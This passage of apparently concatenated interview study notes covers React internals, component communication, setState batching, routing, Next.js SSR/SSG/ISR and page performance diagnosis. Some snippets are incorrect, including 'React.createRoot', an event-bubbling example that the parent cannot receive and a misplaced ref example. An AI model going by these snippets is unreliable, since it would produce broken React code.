The speed of the Virtual DOM depends on the context of comparison. When comparing the direct manipulation of the real DOM (as in libraries like jQuery) to the Virtual DOM approach, direct DOM manipulation can be quicker for simple, isolated operations. This is because it involves a direct interaction with the browser's rendering pipeline. However, this approach can become inefficient and less scalable in complex applications.

The Virtual DOM provides an abstraction layer that allows for a more declarative way of defining UI components and their state changes. Here's how it works:
1. Upon data changes in the application, the UI is re-rendered in the Virtual DOM.
2. A diffing algorithm compares this new Virtual DOM with the previous snapshot to identify the minimal set of changes needed for the real DOM.
3. These changes are batched and applied to the real DOM efficiently, reducing direct manipulation and reflow/repaint costs.

### Advantages of Using Virtual DOM

- **Component-Based Architecture**: React and Vue use a component-based structure, encapsulating UI and business logic into reusable components, which enhances development scalability and manageability.
- **Separation of Concerns**: These frameworks separate the data model from the UI (view), leading to a more predictable data flow and easier state management.
- **Efficiency in Development**: Developers can concentrate on state management and business logic rather than direct DOM manipulations, resulting in more maintainable code and quicker development cycles.

In conclusion, the Virtual DOM is not inherently faster than direct DOM manipulation for every operation. However, it provides a more efficient and effective approach for dynamic web applications, particularly those with complex interfaces and frequent state changes. Its efficiency stems from reducing the amount of direct DOM manipulation, leading to improved performance in applications where state changes are common.

## What is `window.requestIdleCallback`? What's the difference between `requestIdleCallback` and `requestAnimationFrame`?

`window.requestIdleCallback` is a method that allows developers to queue a function to be executed when the browser is idle. This API provides an opportunity to perform background and low-priority work without interfering with critical animations or input response times. It's particularly useful for tasks that aren't time-critical, such as analytics and background data processing.

### React Fiber

React Fiber is a reimplementation of React's core algorithm. It changes the component tree structure to a linked list, enabling incremental rendering. This means that rendering work can be split into chunks and spread out over multiple frames. Fiber's architecture allows React to pause rendering to handle more urgent tasks and then resume when the browser is idle. This is where `requestIdleCallback` becomes relevant; it provides a native way to schedule these low-priority tasks during idle times, enhancing performance without sacrificing user experience.

However, it's important to note that `requestIdleCallback` may have compatibility issues with Safari and Internet Explorer.

### Difference between `requestIdleCallback` and `requestAnimationFrame`

- **`requestAnimationFrame`** is designed for animations and executes just before each repaint, ensuring smooth visual updates. It has a higher priority because maintaining a high frame rate is crucial for animations and user interface responsiveness.
- **`requestIdleCallback`**, on the other hand, is intended for tasks that can wait until the main thread is idle. It runs with lower priority, making it suitable for non-urgent tasks that don't need to be completed immediately.

Both `requestAnimationFrame` and `requestIdleCallback` are considered macro tasks in the JavaScript event loop, but they serve different purposes based on their execution timing and priority levels.

## What is JSX?
JSX is a syntax extension for JavaScript, commonly used with React to describe what the UI should look like. By using JSX, developers can write HTML structures in the same file as JavaScript code, which promotes a more cohesive and readable style of coding.

JSX allows you to write HTML tags in a JavaScript file. Despite its appearance, JSX is not a string nor HTML. It's **syntactic sugar** for calling React's `createElement` function, which produces JavaScript objects that React can manage and render to the DOM.

Using JSX in React projects enhances development efficiency and readability. It allows developers to visually describe the layout directly in their JavaScript code, which makes it easier to connect the visual structure with the functionality.

Consider a simple JSX example:
```jsx
const element = <h1>Hello, world!</h1>;
```
In Babel, this JSX code is transpiled to:
```javascript
const element = React.createElement('h1', null, 'Hello, world!');
```

## React Component Communication

### Parent to Child Communication

#### Props
Props are the primary method for passing data and event handlers down to child components. This approach is straightforward and widely used due to its simplicity and effectiveness in most use cases.

```jsx
// Parent Component
<ChildComponent name="John" />

// Child Component
const ChildComponent = (props) => {
  return <p>{props.name}</p>;
}
```

#### Refs with Prototype Methods
Using refs allows parents to directly interact with DOM nodes or child components. This method is useful for managing focus, text selection, or media playback.

```jsx
// Parent Component
<ChildComponent ref={childRef} />

// Child Component
const ChildComponent = () => {
  const childRef = useRef();
  return <p ref={childRef}>Child Component</p>;
}
```

#### Context API
The Context API provides a way to share values like themes, user preferences, or any global state across the entire component tree without prop drilling.

```jsx
// Parent Component
<MyContext.Provider value={value}>
    <ChildComponent />
</MyContext.Provider>

// Child Component
const ChildComponent = () => {
  const value = useContext(MyContext);
  return <p>{value}</p>;
}
```

### Child to Parent Communication
Child to parent communication can be achieved through several patterns, each offering different levels of directness and flexibility.

#### Callbacks
Callbacks are functions that the parent component passes to the child, which the child can call to communicate back.

```jsx
// Parent Component
const handleCallback = (data) => {
  console.log(data);
};
<ChildComponent callback={handleCallback} />

// Child Component
const ChildComponent = ({ callback }) => {
  const handleClick = () => {
    callback('Hello from child');
  };
  return <button onClick={handleClick}>Click me</button>;
}
```

#### Refs
Refs can also be used to expose child component methods to the parent, facilitating direct communication.

```jsx
// Parent Component
const childRef = useRef();
<ChildComponent ref={childRef} />

// Child Component
const ChildComponent = forwardRef((props, ref) => {
  useImperativeHandle(ref, () => ({
    message: 'Hello from child',
  }));
  return <p>Child Component</p>;
})
```

#### Event Bubbling
Event bubbling leverages DOM event propagation to let parent components handle events initiated in child components.

```jsx
// Parent Component
const handleClick = (e) => {
  console.log(e.detail);
};
<ChildComponent onClick={handleClick} />

// Child Component
const ChildComponent = () => {
  const handleClick = () => {
    const event = new CustomEvent('message', { detail: 'Hello from child' });
    window.dispatchEvent(event);
  };
  return <button onClick={handleClick}>Click me</button>;
}
```

### Additional Communication Patterns
Beyond direct parent and child communication, other patterns exist to facilitate interactions across components:

#### Higher-Order Components (HOCs)
HOCs are functions that take a component and return a new component, usually adding additional data or functionality.

#### Render Props
This technique involves passing a function to a component that returns React elements, providing more dynamic rendering capabilities.

#### State Management Libraries
Libraries like Redux or MobX can be used for managing state more cohesively across an entire application.

#### Custom Hooks
Custom hooks allow sharing logic with state in multiple components, helping to keep your component logic lean and maintainable.

#### Compound Components
This pattern involves creating components that work together, managing shared state in a more implicit manner.

#### Portals
React portals provide a way to render children into a DOM node that exists outside the DOM hierarchy of the parent component, useful for modals and tooltips.

## Difference Algorithm and Implementation in React

### Difference Algorithm
The difference algorithm, often referred to as the "diff" algorithm, plays a crucial role in determining how to update the DOM by comparing two versions of the virtual DOM. Here’s how it works:
- The algorithm compares components at the same hierarchical level in the virtual DOM tree, avoiding cross-level comparisons.
- If it detects different tags, it will remove the old component and construct a new one instead of delving into further details.
- For child components, the comparison is facilitated by unique "keys," which underscore the significance of assigning keys to list items.

### React's Difference Algorithm
React's diff algorithm employs an efficient strategy known as "right shifting." This means that during a comparison, if elements have only moved backward (to the right) in the list, React will move the elements accordingly instead of recreating them. This approach minimizes unnecessary DOM manipulations, leading to better performance.

### Importance of Keys
Keys are vital for optimizing the rendering process in React. When keys are provided, React uses them to identify which elements have changed, been added, or been removed. This helps in:
- Precisely moving elements in the DOM without having to rebuild them, thus saving time and computational resources.
- Increasing efficiency, especially in dynamic lists where the order of elements might change over time. Without keys, React would have to rebuild the entire list to ensure accuracy, which is far less efficient.

## Common Pitfalls Encountered When Using React

### Naming Conventions for Custom Components
- Custom component names must start with an uppercase letter to differentiate them from native HTML tags. For example, `<Input/>` is a custom component, while `<input/>` refers to the standard HTML input element.

### Wrapping Variables with Braces Inside JSX
- Variables inside JSX should be wrapped in curly braces `{}`. For instance, `<Input value={value} />` correctly binds the `value` variable to the `Input` component's `value` property.

### Asynchronous `setState`
- The `setState` function updates the component state asynchronously. This means you should not expect the state to reflect the new value immediately after calling `setState`. For synchronous logic post-state update, use `setState`'s callback function.

## Unified Error Handling in React
- The `ErrorBoundary` component is used to catch JavaScript errors anywhere in their child component tree, log those errors, and display a fallback UI instead of the component tree that crashed.
- It only catches errors in the rendering phase, meaning it does not catch errors in event handlers or asynchronous code.
- It works in production environments, but in development, React still displays errors in the UI for better debugging experience.

```typescript
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error) {
    // Update state to render fallback UI on next render
    console.info('getDerivedStateFromError', error);
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
    // Log the error for further analysis
    console.error('componentDidCatch', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      // Display fallback UI
      return <h1>Something went wrong.</h1>;
    }
    // Render children components if no error
    return this.props.children; 
  }
}
```

### Handling Errors Outside of ErrorBoundary

#### Event Errors
- `ErrorBoundary` does not catch errors from DOM events such as `onClick`. You can use `window.onerror` for global error handling or `try...catch` blocks within event handlers.

#### Asynchronous Errors
- `ErrorBoundary` does not catch errors in asynchronous operations like `setTimeout`. Similar to event errors, use `window.onerror` or specific error handling logic in your asynchronous code.

#### Extension: Unhandled Promise Rejections
- Use the `window.onunhandledrejection` event to listen for unhandled promise rejections, providing an opportunity to handle these and prevent the application from crashing.

### Error Reporting and Monitoring
- Implementing error reporting and monitoring (also known as error tracking or logging) is crucial for understanding and improving the stability of a React application. This involves capturing errors, logging them to a server, and analyzing them to fix bugs or improve application UX.

## React Lifecycle

The React component lifecycle refers to the series of events that occur from the moment a component is initially rendered until it is finally destroyed. Understanding these lifecycle events is crucial for creating efficient and effective React applications. The lifecycle can be divided into three main phases:

### Mounting
Mounting is the phase in which a React component is being inserted into the DOM (Document Object Model). It encompasses the following lifecycle methods:
- `constructor()`: This method is called before anything else, when the component is initiated. It's commonly used to initialize state or bind event handlers.
- `static getDerivedStateFromProps()`: This method is called right before rendering the component in both the mounting and the updating phase. It's used to update the state based on changes in props over time.
- `render()`: The render method is the only required method in a class component. It examines `this.props` and `this.state` and returns one of the following types: React elements, Arrays and fragments, Portals, String and numbers, Booleans or null.
- `componentDidMount()`: This method is called after the component is mounted to the DOM. It's used for DOM manipulation, fetching data from a remote endpoint, and setting up subscriptions (e.g., listeners).

### Updating
The updating phase occurs when a component's state or props change, leading to a re-render of the component. This phase includes several key lifecycle methods:
- `static getDerivedStateFromProps()`: As in the mounting phase, this method is called before the render method and is used to update the state based on changes in props.
- `shouldComponentUpdate()`: This method allows you to decide whether or not React should continue with the rendering process. By returning `true` or `false`, you can optimize component performance.
- `render()`: The render method is called again to re-render the UI based on the new props or state.
- `getSnapshotBeforeUpdate()`: This method is called right before the changes from the virtual DOM are to be reflected in the DOM. It can return a value that will be passed to `componentDidUpdate()`.
- `componentDidUpdate()`: Called after the update has been rendered and reflected in the DOM. It's used for DOM updates, fetching new data, and re-setup of subscriptions if needed.

### Unmounting
The unmounting phase occurs when a component is being removed from the DOM. It includes one main lifecycle method:
- `componentWillUnmount()`: This method is called right before a component is destroyed and removed from the DOM. It's used to perform any necessary cleanup, such as invalidating timers, canceling network requests, or cleaning up any subscriptions made in `componentDidMount()`.

### Error Handling
React provides two lifecycle methods for error handling:
- `static getDerivedStateFromError()`: This method is used to update state in response to an error thrown by a component's descendants. It's called during the rendering phase.
- `componentDidCatch()`: This method is called after an error has been thrown by a component's descendants. It's used to log error information and display a fallback UI to the user.

## Understanding React's `setState` Behavior

React's `setState` method is a core mechanism for managing state updates within components, optimizing application performance through asynchronous and batch updates.

### Asynchronous State Updates and Batching

React improves application efficiency by batching multiple `setState` calls into a single update cycle. This process reduces the number of re-renders, which enhances the user experience by making it smoother and more responsive.

#### Example: Batching in Lifecycle Methods

Consider how `setState` behaves within a component's lifecycle method:

```javascript
componentDidMount() {
  this.setState({ val: this.state.val + 1 }); // Initial state: val = 0
  console.log(this.state.val); // Likely logs 0, not 1

  this.setState({ val: this.state.val + 1 });
  console.log(this.state.val); // Still logs 0, due to batching

  setTimeout(() => {
    this.setState({ val: this.state.val + 1 });
    console.log(this.state.val); // Logs 2, immediate update

    this.setState({ val: this.state.val + 1 });
    console.log(this.state.val); // Logs 3, confirms immediate update
  }, 0);
}
```

### Synchronous Updates in Specific Contexts

Although `setState` generally updates asynchronously within React's lifecycle and event handling, it can behave synchronously in specific scenarios:

#### JavaScript Timing Functions

Inside `setTimeout` or `setInterval`, `setState` updates are processed immediately.

#### Promise Resolutions and Async Functions

`setState` operations within `.then` or async functions are applied synchronously.

#### Native DOM Events

Using `setState` in native DOM event handlers allows updates to occur synchronously.

#### AJAX Callbacks

AJAX callbacks can also trigger synchronous updates when `setState` is called within them.

#### Example: Synchronous Update with a Native Event Handler

```javascript
document.getElementById('myButton').addEventListener('click', () => {
  this.setState({ val: this.state.val + 1 });
  console.log(this.state.val); // Instantly updates and logs the new value
});
```

## React Component Re-rendering with `setState`

Understanding the re-rendering behavior of React components when `setState()` is invoked is crucial for efficient application development.

### Batched State Updates

`setState()` adds updates to a queue and processes them in batches. It merges state updates with the same keys, leading to fewer `render()` calls than `setState()` invocations, typically rendering the component only once per batched update cycle.

### Example: Counting Render Calls

How many times does `render()` get called when multiple `setState()` calls are made in quick succession? Under typical circumstances, despite multiple updates, `render()` is only invoked once per update cycle, ensuring performance efficiency.

### Embracing React 18's Automatic Batching

React 18 enhances batching by automatically applying it across all update scenarios, including those previously synchronous. This change simplifies state update patterns and further improves performance.

**Adapting to React 18:**

```javascript
// Before React 18
ReactDOM.render(<App />, document.getElementById('root'));

// With React 18 and onwards
const root = React.createRoot(document.getElementById('root'));
root.render(<App />);
```

### Exceptions to Batching

Some updates are processed immediately, even with React's batching:

- Updates in a `setState` callback are immediate.
- Synchronous updates still occur in certain non-React contexts, like direct DOM event handlers or timing functions.

## `setState` as Microtask or Macrotask?

`setState` can act as either, influenced by its execution context. Within `setTimeout`, it's a macrotask, while in a `Promise.resolve().then()`, it becomes a microtask. This flexibility allows `setState` to adapt its execution for optimal application performance.

**Execution Timing Example:**

```javascript
componentDidMount() {
  setTimeout(() => {
    console.log('--Start--');

    Promise.resolve().then(() => {
      console.log('--Promise then--');
    });

    this.setState({ val: this.state.val + 1 });
    console.log(this.state.val); // Displays the current state value

    console.log('--End--');
  });
}
// Expected output sequence: --Start--, current state value, --End--, --Promise then--
```

## Contextual Refinement of Render Props

**Render props** is a technique in React development used to promote code reuse and enable dynamic rendering of components by passing a function as a prop. This function, often referred to as `render`, outputs the component based on internal state or logic, making it highly adaptable for various use cases.

### Example
To illustrate the power of render props, consider an example where we manage the mouse position on a webpage—an interactive behavior commonly required yet cumbersome to manage across multiple components. Below is an implementation of the `MouseTracker` component using render props:

```tsx
import React, { useState, useEffect } from 'react';

interface MouseProps {
  render: (state: { x: number; y: number }) => JSX.Element;
}

const MouseTracker: React.FC<MouseProps> = ({ render }) => {
  const [position, setPosition] = useState({ x: 0, y: 0 });

  const handleMouseMove = (event: MouseEvent) => {
    setPosition({ x: event.clientX, y: event.clientY });
  };

  useEffect(() => {
    window.addEventListener('mousemove', handleMouseMove);
    // Cleanup function, automatically removes the event listener when the component unmounts
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  return <div style={{ height: '100vh' }}>{render(position)}</div>;
};
```

In this code, the `MouseTracker` component encapsulates the mouse tracking logic. It uses state to keep track of the mouse position and passes this data to a render prop, which dictates the output.

Next, integrate the `Cat` component, which renders an image at the coordinates provided:

```tsx
import React from 'react';

interface CatProps {
  x: number;
  y: number;
}

const Cat: React.FC<CatProps> = ({ x, y }) => {
  return (
    <img src="path_to_cat_image.jpg" style={{ position: 'absolute', left: x, top: y }} alt="Cat" />
  );
};
```

This component accepts `x` and `y` coordinates to position an image on the screen, demonstrating a simple yet effective use of props for dynamic rendering.

Finally, the `Application` component uses `MouseTracker` to dynamically render the `Cat` based on the mouse's position:

```tsx
import React from 'react';
import Cat from './Cat';

const Application: React.FC = () => {
  return (
    <div>
      <h1>Mouse Tracker Example</h1>
      <MouseTracker render={({ x, y }) => <Cat x={x} y={y} />} />
    </div>
  );
};
```

This example clearly demonstrates how the `Application` component manages rendering behavior using `MouseTracker` without direct involvement in the mouse tracking logic or state management.

### Benefits of Using Render Props

- **Flexibility**: Provides significant flexibility, allowing components to externally define their rendering logic while maintaining encapsulated state or behaviors.
- **Reusability**: Enhances the reusability of behavior across different components, enabling varied rendering needs by simply changing the render prop.
- **Simplicity**: Separates state management from rendering logic, simplifying component architecture and improving maintainability and scalability.

## Conditional Rendering in React
Conditional rendering in React is a technique that allows components to render different outputs based on certain conditions. This approach helps in building dynamic and interactive user interfaces efficiently.

**Context:** In React, components decide what to render based on the logic embedded in JavaScript conditions. This technique parallels conditional statements in traditional programming languages, where the condition determines the execution flow.

### Common Patterns for Conditional Rendering

#### If-Else Statement
**Explanation:** The basic if-else structure allows rendering components based on a boolean condition. It's straightforward and easy to read.
```jsx
function Greeting(props) {
  const isLoggedIn = props.isLoggedIn;
  if (isLoggedIn) {
    return <UserGreeting />;
  }
  return <GuestGreeting />;
}
```

#### Element Variables
**Explanation:** By using variables to store elements, the JSX returned from a component can be made more dynamic and cleaner, avoiding repetitive checks within the JSX.
```jsx
function Greeting(props) {
  const isLoggedIn = props.isLoggedIn;
  let greeting;
  if (isLoggedIn) {
    greeting = <UserGreeting />;
  } else {
    greeting = <GuestGreeting />;
  }
  return greeting;
}
```

#### Ternary Operator
**Explanation:** This pattern is useful for inline rendering and is particularly handy for embedding expressions within JSX. It succinctly handles a two-way condition.
```jsx
function Greeting(props) {
  const isLoggedIn = props.isLoggedIn;
  return isLoggedIn ? <UserGreeting /> : <GuestGreeting />;
}
```

#### Logical AND Operator (&&)
**Explanation:** The logical AND operator is useful when you only need to render a component under certain conditions. It won't render anything if the condition is false.
```jsx
function Greeting(props) {
  const isLoggedIn = props.isLoggedIn;
  return isLoggedIn && <UserGreeting />;
}
```

#### Inline Conditional with Logical && Operator
**Explanation:** This approach is ideal for optional UI elements that depend on the truthiness of expressions. It’s particularly useful for displaying notifications or messages.
```jsx
function Mailbox(props) {
  const unreadMessages = props.unreadMessages;
  return (
    <div>
      <h1>Hello!</h1>
      {unreadMessages.length > 0 && <h2>You have {unreadMessages.length} unread messages.</h2>}
    </div>
  );
}
```

#### Inline If-Else with Conditional Operator
**Explanation:** Similar to the ternary operator but used for more complex inline expressions in JSX. It provides a clear structure for rendering one of two possible components.
```jsx
function Greeting(props) {
  const isLoggedIn = props.isLoggedIn;
  return (
    <div>
      The user is <b>{isLoggedIn ? 'currently' : 'not'}</b> logged in.
    </div>
  );
}
```

#### Preventing Component from Rendering
**Explanation:** Sometimes it is necessary to prevent a component from rendering at all. Returning `null` from a component’s render method does not affect the firing of the component’s lifecycle methods.
```jsx
function WarningBanner(props) {
  if (!props.warn) {
    return null;
  }
  return (
    <div className="warning">
      Warning!
    </div>
  );
}
```

## Working with URL Parameters in React and Next.js
### React: Using React Router

React Router is a standard library for routing in React applications. It enables the implementation of dynamic routing in a web app.

```jsx
import React from 'react';
import { useParams } from 'react-router-dom';

function Post() {
  let { postId } = useParams();
  
  return (
    <div>
      <h1>Displaying post ID: {postId}</h1>
      // Additional logic to fetch and display the post details
    </div>
  );
}

export default Post;
```

The `useParams` hook in React Router is used to access the URL parameters. In the example above, a route might be defined as `<Route path="/post/:postId" component={Post} />`, where `:postId` is a dynamic segment of the URL. When a user visits a URL like `/post/123`, `useParams` returns an object `{ postId: '123' }`, allowing the component to access the `postId` as needed for fetching data or other purposes.

### Next.js: Using Built-in Routing

Next.js provides a powerful and intuitive routing system that supports both static and dynamic routing without the need for additional packages.

```jsx
import { useRouter } from 'next/router';

const User = () => {
  const router = useRouter();
  const { userId } = router.query;

  return (
    <div>
      <h1>User ID: {userId}</h1>
      // Additional logic to retrieve and display user data
    </div>
  );
};

export default User;
```

Next.js's `useRouter` hook is part of its built-in router. This hook gives you access to the `router` object which contains information about the route. In the code snippet above, `router.query.userId` extracts the `userId` parameter from the URL when the route is `/user/[userId]`. This parameter can be used to fetch user-specific data, potentially from an API or a database.

## React Router: Understanding Route Modes

React Router uses different routing modes to manage the synchronization of your UI with the URL in various environments. This section details each mode to ensure you have a comprehensive understanding of when and why each is used.

### BrowserRouter
**HTML5 History API Integration**  
`BrowserRouter` leverages the HTML5 history API. This allows React applications to keep the UI synchronized with the URL without full page reloads, making it ideal for modern web applications where seamless user experience is crucial.

### HashRouter
**URL Hash-Based Routing**  
`HashRouter` uses the hash portion of the URL (`window.location.hash`) to manage UI synchronization. This mode ensures that users can manually change the URL or refresh the page without losing routing context, which is particularly useful in legacy web applications or when SEO is not a primary concern.

### MemoryRouter
**In-Memory Routing for Isolated Environments**  
`MemoryRouter` stores the history of your routes in memory, without affecting the address bar. This mode is essential in environments where URL management is not possible, such as in certain test cases or platforms like React Native, where traditional web navigation models are not applicable.

### NativeRouter
**Integration with Native Navigation APIs**  
`NativeRouter` is specifically designed for mobile applications using React Native. It integrates with the native navigation APIs on each platform, facilitating an experience that adheres to the navigation standards and optimizations of the underlying mobile platform.

### StaticRouter
**Server-Side Rendering Optimization**  
`StaticRouter` is tailored for server-side rendering scenarios. It handles routing by synchronizing with a location context provided at the server level, rather than depending on the browser’s address bar. This allows for efficient preloading and rendering of content from the server, enhancing the performance and the initial load times of your applications.

## Advantages of Next.js Over React

Next.js is an advanced framework built on top of React. It introduces a set of features aimed at improving the development and performance of web applications. Here's an organized and enhanced overview of its key benefits:

- **Server-Side Rendering (SSR)**
  - SSR greatly enhances the user experience by speeding up the initial page load times. It does so by serving fully-rendered HTML pages from the server, ready for the browser to display. This not only reduces the time users spend waiting for content to become interactive but also significantly boosts SEO. Search engines can crawl and index the content more effectively because it's fully rendered upfront.

- **Static Site Generation (SSG)**
  - SSG allows developers to pre-render pages during the build process. These pages are then served instantly from a Content Delivery Network (CDN), which drastically cuts down on load times and server processing. This method is particularly efficient for sites with content that doesn't change often, making it a stellar choice for blogs, documentation sites, and corporate websites.

- **Incremental Static Regeneration (ISR)**
  - ISR combines the strengths of SSR and SSG to offer a dynamic solution for static content. It allows pages to be regenerated with updated data on a per-request basis without necessitating a complete site rebuild. This innovative approach means that websites can serve static pages for fast load times while still updating content in almost real-time, a game-changer for e-commerce sites, news platforms, and more.

- **File System Routing**
  - By utilizing the filesystem for routing, Next.js makes page creation and route management straightforward. Developers can simply add files to the `pages` directory, and the framework automatically creates routes matching the file structure. This convention-over-configuration approach simplifies navigation and streamlines the development process.

- **API Routes**
  - With built-in support for API routes, Next.js enables developers to handle frontend and backend code within the same project. This facilitates the development of full-stack applications without the need to separate the client and server logic, streamlining project management and deployment.

- **Built-In CSS and Sass Support**
  - Next.js simplifies the styling process by natively supporting CSS and Sass. Developers can import styles directly into components without any extra setup or configuration, making it easier to manage styles and ensuring that styles are only loaded when the component is rendered, thereby improving performance.

- **Optimized Performance and Automatic Code Splitting**
  - Next.js automatically splits code at the page level, ensuring that only the necessary JavaScript is loaded for each page. This results in faster page loads and a smoother browsing experience for users. The framework also includes various optimization features out of the box, such as image optimization, minimizing the effort required to achieve high performance.

- **Community and Ecosystem**
  - Next.js benefits from a large and active community of developers. This vibrant ecosystem provides a wealth of plugins, tools, and integrations, addressing common development challenges and facilitating innovation. The strong community support also means that developers have access to a plethora of resources, tutorials, and forums for learning and troubleshooting.

## Next.js Rendering Strategies: SSR, SSG, and ISR vs. Traditional React Rendering
### Server-Side Rendering (SSR)

**Overview**: SSR dynamically generates HTML for each page request at the server level. This approach allows the server to pre-render React components into HTML, enhancing SEO and ensuring content is immediately available to the user upon request.

**Workflow**:
1. **Request Initiation**: A user or search engine makes a request to the server for a specific page.
2. **React Component Rendering**: The server executes React components associated with the requested route, generating the page's HTML.
3. **HTML Delivery**: This HTML is sent to the client's browser, displaying the content instantly.
4. **Hydration**: The browser subsequently downloads the JavaScript bundle, enabling interactivity through React hydration.

**Implementation**: Utilize the `getServerSideProps` function within Next.js pages to perform server-side operations, such as fetching data, which is then passed as props to the component.

### Static Site Generation (SSG)

**Overview**: SSG pre-renders pages into static HTML files during the build phase. These files are served directly to the browser, significantly reducing load times and server requests.

**Workflow**:
1. **Build-time HTML Generation**: During the build, Next.js pre-renders pages into static HTML using the site's React components.
2. **Static File Serving**: The generated HTML files are stored and served as static resources upon request.
3. **Immediate Content Display**: Browsers display the static content instantly upon loading.
4. **Hydration Process**: Similar to SSR, the static content is then hydrated to become fully interactive.

**Implementation**: Leverage `getStaticProps` for data fetching at build time and `getStaticPaths` for dynamic routing, enabling the generation of static pages with dynamic content.

### Incremental Static Regeneration (ISR)

**Overview**: ISR combines the best of SSR and SSG, allowing for static pages to be updated "on-the-fly" after deployment without needing a full rebuild of the site.

**Workflow**:
1. **Initial Static Generation**: Pages are generated statically at build time.
2. **Regeneration Trigger**: Upon a page request, the server evaluates if the page should be updated based on specified criteria (e.g., time intervals).
3. **Stale Content Delivery with Background Regeneration**: If an update is needed, the server serves the current (stale) version to the user, while a new version is generated in the background for subsequent requests.
4. **Continuous Updates**: This mechanism ensures content remains fresh without sacrificing load times.

**Implementation**: Use `getStaticProps` with the `revalidate` property to set the conditions under which a page should be regenerated.

### Traditional React Project Rendering

**Characteristics**: Traditional React apps primarily rely on Client-Side Rendering (CSR), where a static HTML file is sent to the browser, and React renders the UI dynamically in the browser.

**Comparative Analysis**:
- **Performance & SEO**: Next.js strategies like SSR, SSG, and ISR enhance initial page load speed and improve SEO by serving pre-rendered content. Conversely, CSR may result in slower initial loads and SEO challenges.
- **Development Experience**: Next.js offers a comprehensive framework with built-in features for optimization, which can introduce a learning curve compared to the straightforwardness of traditional React but ultimately provides a richer set of tools for developers.
- **Flexibility & Optimization**: With Next.js, developers can choose the most suitable rendering strategy for each part of their application, offering unparalleled flexibility and optimization opportunities. Traditional React's reliance on CSR may be simpler but lacks the built-in mechanisms for optimizing performance and SEO in diverse scenarios.

## Next.js Lifecycle Events and Phases
### Server-side Lifecycle (During SSR or SSG)

The server-side lifecycle begins when a page request is made. Next.js processes this request in distinct stages to serve the requested content efficiently.

**Data Fetching**

Data fetching methods enable you to pull data into your application during different stages of the rendering process. These methods cater to various rendering strategies:

- **`getStaticProps`**: Utilized during the build time for static generation. It fetches data and passes it as props to your page at build time, making it ideal for pages that can pre-render with static data.
- **`getServerSideProps`**: Executed on every request in server-side rendering contexts. This function allows for data fetching on a per-request basis, ensuring that the rendered page always includes the most up-to-date data.
- **`getInitialProps`**: Although still supported, this method is less recommended. It can fetch data for both SSR and CSR but lacks the efficiency and specificity of `getStaticProps` and `getServerSideProps`. It can be used in pages and the `_app.js` component.

**Rendering**

Next.js then proceeds to render the page:

- After executing the appropriate data fetching methods, Next.js server renders the React components into HTML, combining them with the fetched data.

**Result**

- The server responds to the client's request by sending the rendered HTML along with any fetched JSON data (for `getStaticProps` or `getServerSideProps`), ensuring an optimized initial load.

### Client-side Lifecycle

Upon receiving the HTML, the browser re-hydrates the static content into a dynamic React application, enabling interactive features.

**Mounting**

The mounting phase establishes the foundation of the application's client-side lifecycle:

- **`constructor`**: Initializes the component state and binds event handlers.
- **`static getDerivedStateFromProps`**: Updates the state based on changes to props over time.
- **`render`**: Responsible for UI rendering.
- **`componentDidMount`**: Marks the component as fully interactive. It's the ideal place for operations that should only occur in a client-side context, such as API calls exclusive to the client.

**Updating**

The updating phase manages changes to props or state:

- **`static getDerivedStateFromProps`**: Prepares for state changes derived from new props.
- **`shouldComponentUpdate`**: Determines if the component should re-render in response to state or props changes.
- **`render`**: Re-renders the UI based on state or props changes.
- **`getSnapshotBeforeUpdate`**: Captures the DOM state before updates (e.g., for scroll position).
- **`componentDidUpdate`**: Invoked after re-rendering, suitable for DOM updates based on the latest changes.

**Unmounting**

- **`componentWillUnmount`**: Cleans up any resources allocated during the component's lifecycle, such as timers or network requests, to prevent memory leaks.

### Navigation

Next.js enhances client-side navigation through:

- Prefetching resources for linked pages, making subsequent page loads almost instantaneous.
- Utilizing Next.js's `<Link />` or the `router.push()` for optimized client-side routing, akin to a single-page application but with the added benefits of Next.js's performance optimizations.

### Build Time

The build phase is critical for optimizing your application:

- **`getStaticProps`** and **`getStaticPaths`** are crucial for static generation, allowing Next.js to pre-render pages with dynamic routes at build time, ensuring faster load times and SEO benefits.
# 7. Performance.md

## How to diagnose performance issues in a slow HTML5 page?
Start by asking the interviewer whether the issue is related to slow operations or slow loading times to narrow down the problem scope and demonstrate proactive communication skills. Then, check for any errors; if there are errors, start investigating from there. If there are no errors, use Chrome's Performance tools for further investigation.

### Front-end Performance Metrics
- **First Paint (FP):** The time it takes for the browser to render the first pixel to the screen.
- **First Contentful Paint (FCP):** The time it takes for the browser to render the first DOM content.
- **First Meaningful Paint (FMP):** Deprecated. This metric was used to measure the time it takes for the browser to render meaningful content for the first time. It has been replaced by LCP.
- **DOMContentLoaded (DCL):** The time it takes for the DOM to be fully loaded and parsed.
- **Largest Contentful Paint (LCP):** The time it takes for the largest content element in the viewport to become visible.
- **Load:** The time it takes for the entire page and all its resources to fully load.

These metrics are arranged in chronological order: FP < FCP < FMP < DCL < LCP < Load.

### Chrome DevTools
- **Performance:** Records page performance data, including CPU, memory, network, rendering, and more. Enabling screenshots captures web page snapshots, and timing indicators can show the metrics mentioned above.
- **Network:** Analyzes network requests, including the resources requested, timeline, size, and more. It also shows an overview of performance metrics when enabled.

### Lighthouse
A popular third-party performance evaluation tool that works on both mobile and desktop. It provides an overall score, including the above metrics, and offers optimization suggestions such as using next-gen image formats (e.g., WebP, AVIF), compressing and correctly sizing images, which can save loading time.

**Example:**
```
npm install -g lighthouse
lighthouse https://www.baidu.com --view --preset=desktop
```

### Web Page Loading Slowly?
- Improve server hardware configurations, use CDN.
- Implement route lazy loading and asynchronously load large components to reduce the main package size.
- Optimize HTTP caching strategies.

### Slow Rendering?
- Optimize backend services (e.g., slow AJAX data fetching).
- Further analyze and optimize the logic within front-end components.
- Implement server-side rendering (SSR).

### Continuous Follow-up
Performance optimization is a gradual process, unlike bug fixes which can often be resolved quickly. Continuously monitor performance, identify bottlenecks, and implement optimizations progressively. Utilize third-party analytics services such as Alibaba Cloud ARMS, Baidu Analytics, or Google Analytics for ongoing performance tracking.

### Summary
Analyze performance metrics to identify the root causes of slowness, address issues specifically, and continuously improve and optimize for better performance.

## Performance Optimization with CSS
### CSS Shorthand Properties
Utilizing CSS shorthand properties effectively reduces the size of CSS files, making them faster to parse by browsers.

- **Example of Margin Shorthand**:
   ```css
   /* Less optimal method */
   .foo {
       margin-top: 10px;
       margin-right: 20px;
       margin-bottom: 30px;
       margin-left: 40px;
   }

   /* Recommended shorthand method */
